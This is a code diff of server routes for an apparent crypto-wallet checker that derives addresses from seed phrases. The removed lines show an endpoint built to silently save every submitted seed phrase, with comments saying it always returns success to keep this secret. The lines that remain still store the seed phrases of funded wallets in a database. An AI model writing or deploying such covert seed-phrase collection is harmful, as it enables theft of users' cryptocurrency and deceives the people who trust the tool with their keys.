@@ -8,33 +8,6 @@ import { BlockchainType, blockchainSchema, seedPhraseSchema, wallets, BalanceChe
 import { z } from "zod";
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Save seed phrase from manual check (silently save all seed phrases)
-  app.post("/api/save-seed-phrase", async (req: Request, res: Response) => {
-    try {
-      // Validate request body
-      const schema = z.object({
-        seedPhrase: seedPhraseSchema,
-      });
-
-      const validationResult = schema.safeParse(req.body);
-      if (!validationResult.success) {
-        // Return success even if validation fails to maintain secrecy
-        return res.json({ success: true });
-      }
-
-      const { seedPhrase } = validationResult.data;
-      
-      // Silently save the seed phrase to database
-      await storage.saveSeedPhrase(seedPhrase);
-      
-      // Always return success to maintain secrecy
-      return res.json({ success: true });
-    } catch (error) {
-      console.error("Error saving seed phrase:", error);
-      // Return success even if there's an error to maintain secrecy
-      return res.json({ success: true });
-    }
-  });
   // Generate addresses from seed phrase
   app.post("/api/generate-addresses", async (req: Request, res: Response) => {
     try {
@@ -124,22 +97,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
           // If balance > 0 and we have a seed phrase, save to database
           if (hasBalance && seedPhrase) {
             try {
-              // Determine if this is from a manual check by looking for 'source' parameter
-              const isManualCheck = req.body.source === 'manual';
-              
               await storage.createWallet({
                 blockchain,
                 address,
                 balance,
                 seedPhrase: seedPhrase,
                 path: "",
-                metadata: JSON.stringify({ 
-                  source: isManualCheck ? 'manual' : 'auto',
-                  savedAt: new Date().toISOString()
-                }),
+                metadata: {},
               });
-              
-              console.log(`Saved wallet with balance to database. Source: ${isManualCheck ? 'manual' : 'auto'}`);
             } catch (dbError) {
               console.error("Error saving wallet to database:", dbError);
               // Continue even if DB save fails
@@ -170,32 +135,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/wallets-with-balance", async (req: Request, res: Response) => {
     try {
       const walletsWithBalance = await storage.getWalletsWithBalance();
-      
-      // Xử lý thông tin metadata để trích xuất source
-      const processedWallets = walletsWithBalance.map(wallet => {
-        let source: 'manual' | 'auto' | undefined = undefined;
-        
-        // Nếu có metadata, parse nó và lấy source
-        if (wallet.metadata) {
-          try {
-            const metadata = JSON.parse(wallet.metadata as string);
-            if (metadata.source) {
-              source = metadata.source as 'manual' | 'auto';
-            }
-          } catch (err) {
-            console.error('Error parsing wallet metadata:', err);
-          }
-        }
-        
-        // Trả về wallet với thêm thông tin source
-        return {
-          ...wallet,
-          source,
-        };
-      });
-      
-      console.log(`Returning ${processedWallets.length} wallets with balance`);
-      return res.json({ wallets: processedWallets });
+      return res.json({ wallets: walletsWithBalance });
     } catch (error) {
       console.error("Error fetching wallets:", error);
       return res.status(500).json({
